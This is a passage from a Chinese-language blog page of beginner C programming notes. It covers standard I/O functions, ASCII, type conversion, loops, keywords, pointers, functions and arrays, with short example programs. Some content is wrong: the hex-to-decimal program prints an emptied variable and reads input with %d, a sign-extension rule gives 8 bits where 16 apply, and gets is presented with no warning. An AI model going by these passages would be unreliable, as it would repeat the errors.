</span><br><span class="line">	 <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>[1]: 3, 2, 1</p>
<p>3,5,12</p>
<p>[3] 3,2,1</p>
</blockquote>
<h1 id="基本的输入与输出"><a href="#基本的输入与输出" class="headerlink" title="基本的输入与输出"></a>基本的输入与输出</h1><blockquote>
<p><code>int scanf(const char \*format, arg_list)</code><br>　　scanf主要从标准输入流中获取参数值,format为指定的参数格式及参数类型,如<code>scanf(&quot;%s,%d&quot;,str,icount);</code><br>　　它要求在标准输入流中输入类似”son of bitch,1000”这样的字符串,同时程序会将”son of bitch”给str,1000给icount.<br>　　scanf函数的返回值为int值,即成功赋值的个数,在上例中如果函数调用成功,则会返回2,所以我们在写程序时,可以通过<br>　　语句<code>if(scanf(&quot;%s,%d&quot;,str,icount) != 2){...}</code>来判断用户输入是否正确.</p>
<p>　　<code>int printf(const char *format, arg_list)</code><br>　　printf主要是将格式化字符串输出到标准输出流中,在stdio.h头文件中定义了标准的输入和输出,分别是stdin,stdout.<br>　　arg_list可以是变量名,也可以是表达式,但最终都会以值的形式填充进format中.</p>
<p>　　<code>int getc(FILE \*fp)</code><br>　　getc主要是从文件中读出一个字符.常用的判断文件是否读取结束的语句为:<code>(ch = getc(fp)) != EOF</code>,EOF为文件结束标志,定义在stdio.h中,就像<code>EXIT_SUCCESS,EXIT_FAILURE</code>定义在stdlib.h中一样,文件也可以被理解为一种流,所以当fp为<code>stdin时,getc(stdin)</code>就等同于getchar()了.</p>
<p>　　<code>int putc(int ch,FILE \*fp)</code><br>　　putc主要是把字符ch写到文件fp中去.如果fp为stdout,则putc就等同于putchar()了.</p>
<p>　　<code>int getchar(void)</code><br>　　getchar主要是从标准输入流读取一个字符.默认的标准输入流即stdio.h中定义的stdin.但是从输入流中读取字符时又涉及到缓冲的问题,所以并不是在屏幕中敲上一个字符程序就会运行,一般是通过在屏幕上敲上回车键,然后将回车前的字符串放在缓冲区中,getchar就是在缓冲区中一个一个的读字符.当然也可以在while循环中指定终止字符,如下面的语句: <code>while ((c = getchar()) != &#39;#&#39;)</code>这是以#来结束的.</p>
<p>　　<code>int putchar(int ch)</code><br>　　putchar(ch)主要是把字符ch写到标准流stdout中去.</p>
<p>　　<code>char * gets(char \*str)</code><br>　　gets主要是从标准输入流读取字符串并回显，读到换行符时退出,并会将换行符省去.</p>
<p>　　<code>int puts(char \*str)</code><br>　　puts主要是把字符串str写到标准流stdout中去,并会在输出到最后时添加一个换行符.</p>
<p>　　<code>char *fgets(char \*str, int num, FILE \*fp)</code><br>　　str是存放读入的字符数组指针,num是最大允许的读入字符数,fp是文件指针.fgets的功能是读一行字符，该行的字符数不大于num-1.因为fgets函数会在末尾加上一个空字符以构成一个字符串.另外fgets在读取到换行符后不会将其省略.</p>
<p>　　<code>int fputs(char \*str, file *fp)</code><br>　　fputs将str写入fp.fputs与puts的不同之处是fputs在打印时并不添加换行符.</p>
<p>　　<code>int fgetc(FILE \*fp)</code><br>　　fgetc从fp的当前位置读取一个字符.</p>
<p>　　<code>int fputc(int ch, file \*fp)</code><br>　　fputc是将ch写入fp当前指定位置.</p>
<p>　　<code>int fscanf(FILE \*fp, char \*format,...)</code><br>　　fscanf按照指定格式从文件中出读出数据,并赋值到参数列表中.</p>
<p>　　<code>int fprintf(FILE \*fp, char \*format,...)</code><br>　　fprintf将格式化数据写入流式文件中. 　　</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;       </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line"><span class="comment">//定义3个字符变量并初始化  </span></span><br><span class="line">	<span class="keyword">char</span> a=<span class="string">'B'</span>,b=<span class="string">'0'</span>, c=<span class="string">'Y'</span>;</span><br><span class="line"><span class="comment">//向显示器输出字符B  </span></span><br><span class="line">	<span class="built_in">putchar</span>(a);</span><br><span class="line">	<span class="built_in">putchar</span>(b);</span><br><span class="line">	<span class="built_in">putchar</span>(c);</span><br><span class="line">	<span class="built_in">putchar</span>(<span class="string">'\n'</span>);</span><br><span class="line"><span class="comment">//向显示器输出字符O  </span></span><br><span class="line"><span class="comment">//向显示器输出字符Y  </span></span><br><span class="line"><span class="comment">//向显示器输出一个换行符  </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/QbUY1hGr38xzVDJ.png" alt="image-20210522095120230"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">　　  <span class="keyword">char</span> a,b,c;     <span class="comment">//定义字符变量a,b,c  </span></span><br><span class="line">a=getchar();    <span class="comment">//从键盘输入一个字符，送给字符变量a  </span></span><br><span class="line">b=getchar();    <span class="comment">//从键盘输入一个字符，送给字符变量b  </span></span><br><span class="line">c=getchar();    <span class="comment">//从键盘输入一个字符，送给字符变量c  </span></span><br><span class="line"><span class="built_in">putchar</span>(a);     <span class="comment">//将变量a的值输出  </span></span><br><span class="line"><span class="built_in">putchar</span>(b);      <span class="comment">//将变量b的值输出  </span></span><br><span class="line"><span class="built_in">putchar</span>(c);       <span class="comment">//将变量c的值输出  </span></span><br><span class="line"><span class="built_in">putchar</span>(<span class="string">'\n'</span>);    <span class="comment">//换行  </span></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/phaf6dYMQFb5u4x.png" alt="image-20210522095635397"></p>
<h1 id="ASCII码"><a href="#ASCII码" class="headerlink" title="ASCII码"></a>ASCII码</h1><blockquote>
<p>ASCII ((American Standard Code for Information Interchange): 美国信息交换标准代码）是基于拉丁字母的一套电脑编码系统，主要用于显示现代英语和其他西欧语言。它是最通用的信息交换标准，并等同于国际标准ISO/IEC 646。ASCII第一次以规范标准的类型发表是在1967年，最后一次更新则是在1986年，到目前为止共定义了128个字符。<br>　　ASCII 码使用指定的7 位或8 位二进制数组合来表示128 或256 种可能的字符。标准ASCII 码也叫基础ASCII码，使用7 位二进制数（剩下的1位二进制为0）来表示所有的大写和小写字母，数字0 到9、标点符号，以及在美式英语中使用的特殊控制字符 。其中：<br>　　0～31及127(共33个)是控制字符或通信专用字符（其余为可显示字符），如控制符：LF（换行）、CR（回车）、FF（换页）、DEL（删除）、BS（退格)、BEL（响铃）等；<br>　　通信专用字符：SOH（文头）、EOT（文尾）、ACK（确认）等；<br>　　ASCII值为8、9、10 和13 分别转换为退格、制表、换行和回车字符。它们并没有特定的图形显示，但会依不同的应用程序，而对文本显示有不同的影响。<br>　　32～126(共95个)是字符(32是空格），其中48～57为0到9十个阿拉伯数字。<br>　　65～90为26个大写英文字母，97～122号为26个小写英文字母，其余为一些标点符号、运算符号等。<br>　　同时还要注意，在标准ASCII中，其最高位(b7)用作奇偶校验位。所谓奇偶校验，是指在代码传送过程中用来检验是否出现错误的一种方法，一般分奇校验和偶校验两种。奇校验规定：正确的代码一个字节中1的个数必须是奇数，若非奇数，则在最高位b7添0；偶校验规定：正确的代码一个字节中1的个数必须是偶数，若非偶数，则在最高位b7添1。<br>后128个称为扩展ASCII码。许多基于x86的系统都支持使用扩展（或“高”）ASCII。扩展ASCII 码允许将每个字符的第8 位用于确定附加的128 个特殊符号字符、外来语字母和图形符号。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">    <span class="keyword">char</span> ch = <span class="string">'A'</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,ch);　</span><br><span class="line">　　<span class="keyword">return</span> <span class="number">0</span>;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>65</p>
</blockquote>
<h1 id="不同数据类型之间的赋值问题"><a href="#不同数据类型之间的赋值问题" class="headerlink" title="不同数据类型之间的赋值问题"></a>不同数据类型之间的赋值问题</h1><blockquote>
<ol>
<li>各类数值型数据间混合运算时的类型转换规则<br>　　整型、实型、字符型数据间可以混合运算。在这种情况下，需要将不一致的数据类型转<br>   　　换成一致的数据类型，然后进行运算。为了保证运算精度，系统在运算时的转换规则是将存储长度较短的运算对象转换成存储长度较长的类型，然后再进行处理。</li>
</ol>
</blockquote>
<blockquote>
<p><strong>如float型数据必先转换为double型数据，然后与其他操作数进行运算。与此类似，char型或short型数据必先转换为int型数据，然后进行运算。</strong></p>
</blockquote>
<blockquote>
<p><strong>如int型数据与unsigned型数据进行运算，int型转换为unsigned型后方可进行运算。int型数据与double型数据进行运算，int型直接转换为double型后进行运算，不能理解为先转换为unsigned 　　int型，然后转换为long int型，最后再转换为double型。</strong></p>
</blockquote>
<blockquote>
<p><strong>赋值时的类型转换</strong><br>　　<strong>当赋值运算符两侧的类型不同时，需进行类型转换，这种转换也是系统自动进行的。具体转换原则如下：</strong><br>　　<strong>1）float、double型赋值给int型：直接截断小数。</strong><br>　　<strong>例如：int i=f+0.6; f的值4.0，右边算术表达式运算后的结果为一个值为4.6的double型数据，根据上述转换原则，直接舍弃小数，所以i的值为4。</strong><br>　　<strong>2）int、char型赋值给float、double型：补足有效位以进行数据类型转换。</strong><br>　　<strong>例如：float f=4; float为7位有效数字，所以f的值为4.000000。</strong><br>　　<strong>3）char型（1字节）赋值给int型（2字节）：数值赋给int的低8位，高8位补0。</strong><br>　　<strong>4）long int型赋值给int型：long int截断低字节给int型。</strong><br>　　<strong>5）int 型赋值给long int：赋给long int的低16位，如果int的最高位是0，则long int的高16位全为0；如果int的最高位是1，则long int的高8位全为1（称为“符号扩展”）。</strong><br>　　<strong>6）unsigned int型赋值给int型：直接传送数值。</strong><br>　　<strong>7）非unsigned数据型赋值给位数相同的unsigned 数据：直接传送数值</strong><br>　　<strong>强制类型转换</strong><br>　　<strong>除了以上的两种自动类型转换外，在C语言中，允许强制类型转换，将某一数据的数据类型转换为指定的另一种数据类型。强制转换是用强制转换运算符进行的，强制转换运算符为：（类型名），强制转换运算符组成的运算表达式的一般形式为：</strong><br>　　<strong>(类型名)(表达式)</strong><br>　　<strong>例如：</strong><br>　　<strong>(int)(x + y) //将x+y的值转换成整型，即取整数部分。</strong><br>　　<strong>(float)x + y //将x转换成单精度型。</strong></p>
<hr>
<p>　　<strong>强制转换运算符优先级比算术运算符高。同表达式中数据类型的自动转换一样，强制类型转换也是临时转换，对原运算对象的类型没有影响。</strong><br>　　<strong>例如，已知有变量定义：int b=7;float a=2.5,c=4.7;求下面算术表达式的值。</strong><br>　　a+(int)(b/3<em>(int)(a+c)/2.0)%4；<br>　　根据运算符结合性规则，上述表达式要自左之右执行，b/3为2，2</em>int(a+c)为14，14/2.0为7.0，强制类型转换后为7，7%4为3；a的值2.5与3相加，最终结果为5.5。** 　　</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;  </span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span>  </span></span><br><span class="line"><span class="function"></span>&#123;  </span><br><span class="line">	<span class="keyword">float</span> a,b,c,t;</span><br><span class="line">	<span class="built_in">scanf</span>(<span class="string">"%f,%f,%f"</span>,&amp;a,&amp;b,&amp;c);  </span><br><span class="line">	<span class="keyword">if</span>(a&gt;b) </span><br><span class="line">	&#123;</span><br><span class="line">		t=a;</span><br><span class="line">		a=b;</span><br><span class="line">		b=t;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(a&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">		t=a;</span><br><span class="line">		a=c;</span><br><span class="line">		c=t;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(b&gt;c)</span><br><span class="line">	&#123;</span><br><span class="line">		t=b;</span><br><span class="line">		b=c;</span><br><span class="line">		c=t;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"%5.2f,%5.2f,%5.2f\n"</span>,a,b,c);  <span class="comment">//顺序输出a,b,c的值  </span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/TDXu2HJjqo6IYZM.png" alt="image-20210522100659969"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">int power(int n) &#x2F;&#x2F; 编写计算16的n次方的函数</span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	int s&#x3D;1;</span><br><span class="line">	for(i&#x3D;1;i&lt;&#x3D;n;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		s&#x3D;s*16;</span><br><span class="line">	&#125;</span><br><span class="line">	return s;</span><br><span class="line">&#125;</span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	int m;&#x2F;&#x2F;定义变量m存放16进制数</span><br><span class="line">	int n;&#x2F;&#x2F;定义变量n存放10进制数</span><br><span class="line">	int i;&#x2F;&#x2F;定义变量i记录指数  </span><br><span class="line">	int r;&#x2F;&#x2F;定义变量r记录16进制数的某位的数 </span><br><span class="line">	printf(&quot;please enter a hexadecimal number 16:&quot;);  &#x2F;&#x2F;请输入一个16进制数:</span><br><span class="line">	scanf(&quot;%d&quot;,&amp;m);&#x2F;&#x2F;用m接受用户输入的16进制数  </span><br><span class="line">	n&#x3D;0;</span><br><span class="line">	i&#x3D;0;</span><br><span class="line">	while(m)</span><br><span class="line">	&#123;</span><br><span class="line">		r&#x3D;m%10;</span><br><span class="line">		n&#x3D;n+r*power(i);</span><br><span class="line">		m&#x3D;m&#x2F;10;</span><br><span class="line">		i++;</span><br><span class="line">	&#125;</span><br><span class="line">	printf(&quot;16 hexadecimal number%d correspinding to 10 hexadecimal numbe is :%d\n&quot;,m,n); &#x2F;&#x2F;16进制数%d对应的10进制数是</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/zSJk9LPHq4iO8j6.png" alt="image-20210522102021563"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">      <span class="keyword">int</span> i=<span class="number">1</span>,sum=<span class="number">0</span>;      <span class="comment">//定义变量i的初始值为1，sum的初始值为0</span></span><br><span class="line">      <span class="keyword">while</span>(i&lt;=<span class="number">100</span>)      <span class="comment">//当i&gt;100，条件表达式i&lt;=100的值为假，不执行循环体</span></span><br><span class="line">      &#123;             <span class="comment">//循环体开始</span></span><br><span class="line">       sum=sum+i;       <span class="comment">//第一次累加后，sum的值为1</span></span><br><span class="line">       i++;          <span class="comment">//加完后，i的值加1，为下次累加做准备</span></span><br><span class="line">       &#125;                     <span class="comment">//循环体结束</span></span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"sum=%d\n"</span>,sum);<span class="comment">//输出1+2+3+...+100的累加和</span></span><br><span class="line">       <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="while"><a href="#while" class="headerlink" title="while"></a>while</h1><blockquote>
<p>C语言循环控制语句提供了 while语句、do-while语句和for语句来实现循环结构。<br>　　<strong>while循环语句</strong><br>　　一般形式如下：<br>　　while（表达式）<br>　　语句<br>　　<strong>do-while语句</strong><br>　　一般形式如下：<br>　　do语句while（表达式）；<br>　　do-while循环是先执行语句，然后对表达式求值。若值为真，则再次执行语句，如此反复执行，否则将结束循环。语句可以是简单语句，也可以是复合语句。<br>　　<strong>for语句</strong><br>　　for语句是循环控制结构中使用最广泛的一种循环控制语句，特别适合已知循环次数的情况。<br>　　一般形式如下：<br>　　for ( [表达式 1]; [表达式 2 ]; [表达式3] )语句<br>　　其中：<br>　　表达式1：一般为赋值表达式，给控制变量赋初值；<br>　　表达式2：关系表达式或逻辑表达式，循环控制条件；<br>　　表达式3：一般为赋值表达式，给控制变量增量或减量；<br>　　语句：循环体，当有多条语句时，必须使用复合语句。<br>　　其执行过程如下：首先计算表达式1，然后计算表达式 2。若表达式2为真，则执行循环体；否则，退出 for循环，执行for循环后的语句。如果执行了循环体，则循环体每执行一次，都计算表达式3，然后重新计算表达式2，依此循环，直至表达式 2的值为假，退出循环。<br>　　for语句的三个表达式都是可以省略的，但分号“;”绝对不能省略。for语句有以下几种格式：<br>　　（1）for(; ;) 语句;<br>　　（2）for(;表达式2;表达式3 ) 语句;<br>　　（3）for(表达式1;表达式2;) 语句;<br>　　（4）for(i=1,j = n; i &lt; j; i ++,j - - ) 语句;<br>　　<strong>三种语句比较</strong><br>　　同一个问题，往往既可以用 while语句解决，也可以用 do-while或者for语句来解决，但在实际应用中，应根据具体情况来选用不同的循环语句。选用的一般原则是：<br>　　(1) 如果循环次数在执行循环体之前就已确定，一般用 for语句。如果循环次数是由循环体的执行情况确定的，一般用 while语句或者do- while语句。<br>　　(2) 当循环体至少执行一次时，用 do-while语句，反之，如果循环体可能一次也不执行，则选用while语句。<br>　　C++/C循环语句中，for语句使用频率最高，while语句其次，do语句很少用。<br>　　三种循环语句for、while、do-while可以互相嵌套自由组合。但要注意的是，各循环必须完整，相互之间绝不允许交叉。<br>　　<strong>其他循环语句</strong><br>　　<strong>多重循环结构</strong><br>　　在多重循环中，如果有可能，应当将最长的循环放在最内层，最短的循环放在最外层，以减少CPU跨越循环层的次数。<br>　　一个循环体内又包含另一个完整的循环结构<br>　　三种循环可互相嵌套,层数不限<br>　　外层循环可包含两个以上内循环,但不能相互交叉</p>
</blockquote>
<p><img src="https://i.loli.net/2021/05/22/eHgQPjWEq4f5rty.png" alt="image-20210522102212026"></p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="code"><pre><span class="line">　c语言32个关键字</span><br><span class="line">auto ：声明自动变量 一般不使用  </span><br><span class="line">　　double ：声明双精度变量或函数  </span><br><span class="line">　　int： 声明整型变量或函数  </span><br><span class="line">　　struct：声明结构体变量或函数  </span><br><span class="line">　　break：跳出当前循环  </span><br><span class="line">　　else ：条件语句否定分支（与 if 连用）  </span><br><span class="line">　　long ：声明长整型变量或函数      </span><br><span class="line">　　switch :用于开关语句   </span><br><span class="line">　　case：开关语句分支    </span><br><span class="line">　　enum ：声明枚举类型     </span><br><span class="line">　　register：声明积存器变量   </span><br><span class="line">　　typedef：用以给数据类型取别名（当然还有其他作用）  </span><br><span class="line">　　char ：声明字符型变量或函数  </span><br><span class="line">　　extern：声明变量是在其他文件正声明（也可以看做是引用变量）  </span><br><span class="line">　　return ：子程序返回语句（可以带参数，也看不带参数）    </span><br><span class="line">　　union：声明联合数据类型    </span><br><span class="line">　　const ：声明只读变量    </span><br><span class="line">　　float：声明浮点型变量或函数  </span><br><span class="line">　　short ：声明短整型变量或函数  </span><br><span class="line">　　unsigned：声明无符号类型变量或函数  </span><br><span class="line">　　continue：结束当前循环，开始下一轮循环   </span><br><span class="line">　　for：一种循环语句(可意会不可言传）        </span><br><span class="line">　　signed：生命有符号类型变量或函数    </span><br><span class="line">　　void ：声明函数无返回值或无参数，声明无类型指针（基本上就这三个作用）  </span><br><span class="line">　　default：开关语句中的“其他”分支   </span><br><span class="line">　　goto：无条件跳转语句      </span><br><span class="line">　　sizeof：计算数据类型长度    </span><br><span class="line">　　volatile：说明变量在程序执行中可被隐含地改变   </span><br><span class="line">　　do ：循环语句的循环体  </span><br><span class="line">　　while ：循环语句的循环条件  </span><br><span class="line">　　static ：声明静态变量</span><br></pre></td></tr></table></figure></div>

<h1 id="指针"><a href="#指针" class="headerlink" title="指针"></a>指针</h1><blockquote>
<p><strong>1．定义方法</strong><br>　　形式：<br>　　类型标识符<em>变量标识符；<br>　　定义存放指定类型数据地址的指针变量。<br>　　类型标识符是定义指针的基类型，给出指针数据对应存储单元所存放的数据的类型，一般用“指向”这个词来说明这种关系，即类型标识符给出指针所指向的数据类型，可以是简单类型，也可以是复杂类型。用“</em>”表示定义的是指针变量，不是普通变量。变量标识符给出的是指针变量名。<br>　　例如：<br>　　(1)Int <em>p1，</em>p2，<em>p3；<br>　　定义指向整型数据的指针变量p1、p2、p3。<br>　　(2)float *q1，</em>q2，<em>q3；<br>　　定义指向实型数据的指针变量q1、q2、q3。<br>　　(3)char</em>r1，<em>r2，</em>r3；<br>　　定义指向字符型数据的指针变量r1、r2、r3。<br>　　(4)struct date<br>　　{int year；<br>　　int month；<br>　　int day;<br>　　}*t1， *t2， *t3；<br>　　定义指向struct date类型数据的指针变量t1、t2、t3。</p>
</blockquote>
<blockquote>
<p><strong>2．指针变量所指向的变量特定类型的数据</strong><br>　　定义的指针变量用于存放指向类型数据的地址，我们可以通过指针运算“<em>”，引用指针变量所指向的数据。有关内容我们在指针运算中加以介绍。<br>　　例如，对指针变量p1、p2、p3，假定已有值，\</em>p1、<em>p2、</em>p3代表指针变量p1、p2、p3所指向的数据，也就是p1、p2、p3的值对应的存储单元里存放的数据，称为指针变量所指向的变量，简称指针指向变量。<br>　　指针类型也是一种复杂类型，指针指向变量可以认为是指针数据的分量。指针指向变量相当于基类型变量。<br>　　如果指针变量p1、p2、p3分别存放整型变量i、j、k的地址，则p1指向i，p2指向j，p3指向k。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">int</span> a=<span class="number">100</span>,b=<span class="number">10</span>;     <span class="comment">//定义整型变量a,b,并初始化</span></span><br><span class="line">	<span class="keyword">int</span> * pointer_1,* pointer_2;  <span class="comment">//定义指向整型数据的指针变量pointer_1,pointer_2</span></span><br><span class="line">	pointer_1=&amp;a;   <span class="comment">//把变量a的地址赋给指针变量pointer_1</span></span><br><span class="line">	pointer_2=&amp;b;    <span class="comment">//把变量b的地址赋给指针变量pointer_2</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"a=%d,b=%d\n"</span>,a,b);  <span class="comment">//输出变量a和b的值</span></span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"* pointer_1=%d,* pointer_2=%d\n"</span>,* pointer_1,* pointer_2);  <span class="comment">//输出变量a和b的值</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><img src="https://i.loli.net/2021/05/22/TgmJXiQSCtxOdoF.png" alt="image-20210522103052215"></p>
<h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><blockquote>
<p>　一、无参函数的定义形式<br>　　类型标识符 函数名()<br>　　 {<br>　　 声明部分<br>　　 语句<br>　　 }<br>　　其中类型标识符和函数名称为函数头。类型标识符指明了本函数的类型，函数的类型实际上是函数返回值的类型。该类型标识符与前面介绍的各种说明符相同。函数名是由用户定义的标识符，函数名后有一个空括号，其中无参数，但括号不可少。<br>　　{}中的内容称为函数体。在函数体中声明部分，是对函数体内部所用到的变量的类型说明。<br>　　在很多情况下都不要求无参函数有返回值，此时函数类型符可以写为void。<br>　　我们可以改写一个函数定义：<br>　　 void Hello()<br>　　 {<br>　　 printf (“Hello,world \n”);<br>　　 }<br>　　这里，只把main改为Hello作为函数名，其余不变。Hello函数是一个无参函数，当被其它函数调用时，输出Hello world字符串。<br>　　二、有参函数定义的一般形式<br>　　类型标识符 函数名(形式参数表列)<br>　　 {<br>　　 声明部分<br>　　 语句<br>　　 }<br>　　有参函数比无参函数多了一个内容，即形式参数表列。在形参表中给出的参数称为形式参数，它们可以是各种类型的变量，各参数之间用逗号间隔。在进行函数调用时，主调函数将赋予这些形式参数实际的值。形参既然是变量，必须在形参表中给出形参的类型说明。<br>　　例如，定义一个函数，用于求两个数中的大数，可写为：<br>　　 int max(int a, int b)<br>　　 {<br>　　 if (a&gt;b) return a;<br>　　 else return b;<br>　　 }<br>　　第一行说明max函数是一个整型函数，其返回的函数值是一个整数。形参为a,b,均为整型量。a,b的具体值是由主调函数在调用时传送过来的。在{}中的函数体内，除形参外没有使用其它变量，因此只有语句而没有声明部分。在max函数体中的return语句是把a(或b)的值作为函数的值返回给主调函数。有返回值函数中至少应有一个return语句。<br>　　在Ｃ程序中，一个函数的定义可以放在任意位置，既可放在主函数main之前，也可放在main之后。</p>
</blockquote>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="C"><figure class="iseeu highlight /c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print_star</span><span class="params">()</span></span>;        <span class="comment">//声明print_star 函数</span></span><br><span class="line">	<span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">()</span></span>;     <span class="comment">//声明print_message函数</span></span><br><span class="line">	print_star();             <span class="comment">//调用print_star 函数</span></span><br><span class="line">	print_message();          <span class="comment">//调用print_message函数</span></span><br><span class="line">	print_star();             <span class="comment">//调用print_star 函数</span></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_star</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"*************\n"</span>);  <span class="comment">//输出一行*号</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">print_message</span><span class="params">()</span>         <span class="comment">//定义print_message函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">"How do you do!\n"</span>); <span class="comment">//输出一行文字信息</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h1 id="数组"><a href="#数组" class="headerlink" title="数组"></a>数组</h1><blockquote>
<p><strong>1、数组的概念、定义和使用</strong><br>　　数组（array）是C语言中用于组合同类型数据对象的机制。一个数组里汇集一批对象（数组元素）。程序中既能从数组出发处理其中的个别元素，也能以统一方式处理数组的一批元素或所有元素。后一处理方式特别重要，是由一批成员构成的数组和一批独立命名的变量间的主要区别。数组机制要解决三个问题：）描述数组的性质，定义数组变量； ）使用数组，包括通过数组变量使用元素； ）实现数组，即在内存里为数组安排一种存储方式，使程序里可以方便地操作它们。当然，最后一个问题主要与语言的实现有关系，在实现C语言系统时，必须确定如何实现数组变量。了解这方面情况也有利于在编程时正确使用数组。<br>　　<strong>2、数组变量定义</strong><br>　　根据数组的性质，在定义数组变量（下面简单说成 “定义数组”）需要说明两个问题： ）该数组（变量）的元素是什么类型的； ）这个数组里包含多少个元素。C语言规定，每个数组变量的大小是固定的，需要在定义时说明。数组定义的形式与简单变量类似，但需要增加有关元素个数的信息。在被定义变量名之后写一对方括号就是一个数组定义，指定元素个数的方式是在括号里写一个整型表达式。人们常把数组元素类型看作数组的类型，把元素类型为整型的数组说成是整型数组，类似地说双精度数组等。</p>
</blockquote>
<blockquote>
